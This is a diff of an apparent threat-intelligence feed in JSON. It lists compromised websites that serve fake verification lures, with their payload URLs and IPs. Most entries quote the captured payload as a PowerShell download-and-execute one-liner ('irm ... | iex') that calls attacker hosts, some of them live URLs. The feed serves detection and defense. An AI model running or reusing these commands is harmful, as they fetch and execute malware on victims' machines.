@@ -1,5 +1,127 @@
 [
   {
+    "UrlDomain": "jrveventos.com.br",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "claude-flare-verification.vercel.app",
+      "2fjrveventos.com.br"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win"
+    ],
+    "IP": [
+      "77.37.83.40"
+    ],
+    "Related": [],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlf1lre1ihg0omlt36wp1of",
+    "ScannedAt": "2026-11-18T01:01:43.475000+00:00"
+  },
+  {
+    "UrlDomain": "www.superglobeinc.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.225.249"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwlenmwv1ies0omlx1cn7azg",
+    "ScannedAt": "2026-11-18T00:50:51.757000+00:00"
+  },
+  {
+    "UrlDomain": "hasanahcentre.co.uk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d286277597a7223c"
+    ],
+    "IP": [
+      "77.37.53.78"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d286277597a7223c')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d286277597a7223c"
+    ],
+    "ReportId": "cmwlemnhr1ic60omluyv0dmgc",
+    "ScannedAt": "2026-11-18T00:50:05.813000+00:00"
+  },
+  {
+    "UrlDomain": "laurencemalazzi.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "81.169.145.150"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwlelvxw1ia70omlg26sddeu",
+    "ScannedAt": "2026-11-18T00:49:30.143000+00:00"
+  },
+  {
+    "UrlDomain": "hwcolimited.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "66.96.147.103"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/ebf9da4f21143943",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29916048",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29916048",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&_v=29916048",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&_v=29916048",
+        "Type": "Reference"
+      },
+      {
+        "Value": "s",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/ebf9da4f21143943'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/ebf9da4f21143943"
+    ],
+    "ReportId": "cmwlelo8a1i9h0omltrse0fps",
+    "ScannedAt": "2026-11-18T00:49:20.146000+00:00"
+  },
+  {
     "UrlDomain": "www.lapetitebarque.fr",
     "DeliveryUrl": [
       "sentrydb.org",
@@ -10421,53 +10543,5 @@
     ],
     "ReportId": "cmwbez2fg06ao0nmlov0j0g7o",
     "ScannedAt": "2026-11-11T01:02:03.343000+00:00"
-  },
-  {
-    "UrlDomain": "thefoodsauciety.co.uk",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "187.77.100.8"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/c7b605b31ca2f950",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=bc8dc0ce0c96053fe5d005b5065340e6a77e4a01ae5898f7&amp;_v=29905977",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/c7b605b31ca2f950'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/c7b605b31ca2f950"
-    ],
-    "ReportId": "cmwbetx19069t0nmlxbqcg989",
-    "ScannedAt": "2026-11-11T00:58:03.052000+00:00"
-  },
-  {
-    "UrlDomain": "website-wizard.de",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.22.104.110"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/1e24abac1ebd5ed2",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/1e24abac1ebd5ed2'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/1e24abac1ebd5ed2"
-    ],
-    "ReportId": "cmwbejue2065s0nmlscnp3a86",
-    "ScannedAt": "2026-11-11T00:50:13.046000+00:00"
   }
 ]
